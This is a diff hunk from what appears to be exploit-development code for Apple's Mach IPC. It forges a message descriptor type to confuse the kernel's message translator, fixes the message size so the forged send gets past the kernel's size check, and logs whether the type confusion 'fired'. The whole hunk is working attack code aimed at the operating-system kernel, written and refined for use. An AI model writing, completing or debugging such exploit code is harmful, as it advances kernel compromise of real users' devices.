@@ -985,12 +985,18 @@ static NSURL *p073_model_url(NSString *name) {
                 d2->disposition = MACH_MSG_TYPE_COPY_SEND;
                 d2->type = 1;   /* MACH_MSG_OOL_DESCRIPTOR — the forged word */
                 h2->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
-                h2->msgh_size = (mach_msg_size_t)(sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t) + 12);
+                /* v8b (00:06 12 lesson): the kernel minimum for a 1-desc complex
+                   msg = hdr+body+16 (the arm64 wire desc stride) — my 12 sizing
+                   sent MACH_SEND_TOO_SMALL (268435464 = 0x8) and MY banner
+                   mislabeled it "confused". Honest send = 16B stride. */
+                h2->msgh_size = (mach_msg_size_t)(sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t) + 16);
                 h2->msgh_remote_port = probePort;
                 kern_return_t kr2 = mach_msg(h2, MACH_SEND_MSG, h2->msgh_size, 0,
                                              MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
-                p073_log(@"[*] forged-type send kr=%u (%s) — accepted = translator confused",
-                         kr2, mach_error_string(kr2));
+                p073_log(@"[*] forged-type send kr=%u (%s)%s",
+                         kr2, mach_error_string(kr2),
+                         kr2 == 0 ? " — ACCEPTED: translator confused (the swap's first fire)"
+                                  : " — rejected pre-translation (honest)");
                 uint8_t rbuf2[0x100]; memset(rbuf2, 0, sizeof rbuf2);
                 mach_msg_header_t *rh2 = (mach_msg_header_t *)rbuf2;
                 kr2 = mach_msg(rh2, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, sizeof rbuf2, probePort, 1000, MACH_PORT_NULL);
